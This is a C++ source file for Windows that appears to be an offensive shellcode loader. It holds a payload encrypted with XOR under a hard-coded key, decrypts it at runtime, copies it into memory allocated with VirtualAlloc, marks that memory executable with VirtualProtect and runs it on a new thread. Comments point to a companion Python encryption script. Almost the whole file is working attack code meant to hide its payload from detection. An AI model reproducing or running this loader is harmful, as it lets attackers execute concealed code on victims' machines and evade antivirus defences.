#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}
using namespace std;

int main() {




	 
/*	
* ///ShellXORER.py in 2.7
	1-	Edit File Path
	2-	Edit KEY  
	3-	run
	*/
	unsigned char ShellCode[] = { 0xcc, 0x30, 0xc1, 0x91, 0x97, 0x89, 0xb4, 0x74, 0x69, 0x30, 0x39, 0x13, 0x34, 0x37, 0x33, 0x25, 0x22, 0x21, 0x1, 0xaa, 0x27, 0x3d, 0xec, 0x33, 0x14, 0x3c, 0xe2, 0x62, 0x60, 0xa, 0xfe, 0x35, 0x41, 0x3c, 0xff,
		0x1b, 0x60, 0x30, 0x4d, 0xc2, 0x2d, 0x2b, 0x39, 0x45, 0xa0, 0x78, 0x49, 0x82, 0xd9, 0x5b, 0x0, 0x8, 0x76, 0x45, 0x10, 0x39, 0x83, 0xbc, 0x6a, 0x20, 0x75, 0xb5, 0x8b,
		0xdd, 0x2a, 0x3, 0x24, 0x2f, 0xea, 0x26, 0x54, 0xe2, 0x72, 0x44, 0xa, 0x74, 0xb7, 0xea, 0xf4, 0xfc, 0x69, 0x30, 0x78, 0xa, 0xf0, 0xa7, 0x15, 0x13, 0x3c, 0x68, 0xe0,
		0x28, 0xc9, 0x3d, 0x7f, 0x25, 0xff, 0x34, 0x49, 0x79, 0x79, 0x92, 0x96, 0x31, 0x29, 0x8b, 0xbd, 0x28, 0xbb, 0x4c, 0xca, 0x3d, 0x66, 0xb7, 0x39, 0x45, 0xa0, 0x78, 0x49,
		0x82, 0xd9, 0x26, 0xa0, 0xbd, 0x79, 0x28, 0x31, 0xb9, 0x7a, 0x95, 0x12, 0x90, 0x38, 0x77, 0x25, 0x14, 0x70, 0x7, 0x4c, 0xb6, 0x14, 0xac, 0x2c, 0x2d, 0xbb, 0x38, 0x66, 0x3c,
		0x66, 0xb1, 0x12, 0x35, 0xe2, 0x3c, 0x30, 0x6, 0xfe, 0x27, 0x7d, 0x3d, 0x75, 0xb9, 0x71, 0xf3, 0x46, 0xfd, 0x2f, 0x60, 0xa4, 0x35, 0x31, 0x71, 0x20, 0x1c, 0x2c, 0x3d,
		0x20, 0x2c, 0x35, 0x30, 0x71, 0x22, 0xa, 0xf6, 0x8b, 0x41, 0x35, 0x26, 0x96, 0xd0, 0x20, 0x3, 0x2c, 0x3d, 0x29, 0xff, 0x66, 0x80, 0x67, 0x87, 0xbd, 0x8a, 0x3a, 0x29, 
		0xce, 0x75, 0x69, 0x30, 0x78, 0x42, 0x75, 0x67, 0x61, 0x3c, 0xf9, 0xe4, 0x31, 0x79, 0x42, 0x75, 0x26, 0xdb, 0x45, 0xff, 0x6, 0xb7, 0x87, 0x97, 0xce, 0x97, 0xd4, 0xd6, 
		0x22, 0x28, 0x8a, 0xde, 0xd7, 0xc8, 0xfa, 0x9e, 0xa1, 0x3c, 0xea, 0xf4, 0x50, 0x7e, 0x73, 0x1b, 0x6b, 0xf4, 0x8f, 0x89, 0x45, 0x7d, 0xf9, 0x32, 0x74, 0x13, 0x1b, 0x1e, 
		0x69, 0x69, 0x39, 0xcb, 0xaf, 0x98, 0xb4, 0x17, 0x15, 0x5, 0x53, 0x56, 0x27, 0xd, 0x2, 0x61 };
	unsigned int payload_len = sizeof(ShellCode);
	char key[] = "0xBugatti";

	DWORD oldprotect = 0;

	
	// Allocate a memory buffer for payload
//#define MEM_COMMIT                      0x00001000  
//#define MEM_RESERVE                     0x00002000  
//#define PAGE_READWRITE			      0x04   
//#define PAGE_EXECUTE_READ				  0x20    


	//void* exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	void* exec_mem = VirtualAlloc(0, payload_len, 0x1000 | 0x2000, 0x04);
	printf("%-20s : 0x%-016p\n", "payload addr", (void*)ShellCode);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);
	// Decrypt (DeXOR) the payload
	std::cout << "\n[+][+] Decrypting Shell Code [+][+]\n";
	XOR((char*)ShellCode, payload_len, key, sizeof(key));

	// Copy payload to new buffer
	RtlMoveMemory(exec_mem, ShellCode, payload_len);
	printf("Payload Moved To memory");
	// Make new buffer as executable

	BOOL rv = VirtualProtect(exec_mem, payload_len, 0x20, &oldprotect);
	if (rv) {
		printf("\nShellCode Injected Succefully!\n");
	}


	HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);
	getchar();

	return 0;
}
